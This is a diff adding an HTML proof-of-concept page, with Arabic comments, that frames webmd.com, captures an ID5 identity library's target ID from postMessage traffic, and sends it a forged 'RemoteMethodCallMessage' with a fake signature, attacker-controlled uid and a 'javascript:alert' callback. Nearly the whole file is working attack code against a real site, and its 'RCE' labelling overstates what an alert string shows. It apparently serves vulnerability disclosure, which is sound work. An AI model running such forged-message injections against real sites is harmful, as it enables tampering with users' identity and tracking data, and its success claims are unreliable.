@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC #1 - RemoteMethodCall Injection</title>
+</head>
+<body>
+    <h2>🔴 PoC: Remote Method Call Injection</h2>
+    <iframe id="target" src="https://www.webmd.com" width="100%" height="400"></iframe>
+    
+    <script>
+        // الانتظار حتى يتم اكتشاف ID الهدف
+        let targetID = null;
+        
+        window.addEventListener('message', (e) => {
+            if (e.data?._isId5Message && e.data.type === 'HelloMessage') {
+                targetID = e.data.src;
+                console.log('🎯 Target ID:', targetID);
+                
+                // تنفيذ الهجوم بعد 3 ثواني
+                setTimeout(executeRCE, 3000);
+            }
+        });
+        
+        function executeRCE() {
+            const maliciousRPC = {
+                _isId5Message: true,
+                id: Date.now(),
+                timestamp: Date.now(),
+                type: 'RemoteMethodCallMessage',
+                src: 'attacker-' + Math.random().toString(36).substr(2, 9),
+                dst: targetID, // استهداف المثيل المحدد
+                payload: {
+                    target: 'follower',
+                    methodName: 'notifyUidReady',
+                    methodArguments: [{
+                        timestamp: Date.now(),
+                        responseObj: {
+                            signature: 'FORGED_SIGNATURE_' + Date.now(),
+                            uid: 'ATTACKER_CONTROLLED_' + Math.random(),
+                            override: true,
+                            force: true,
+                            // محاولة حقن كود ضار
+                            callback: "javascript:alert('RCE_SUCCESS')"
+                        }
+                    }]
+                }
+            };
+            
+            document.getElementById('target').contentWindow.postMessage(maliciousRPC, '*');
+            console.log('🔥 RCE Payload sent!');
+        }
+    </script>
+</body>
+</html>
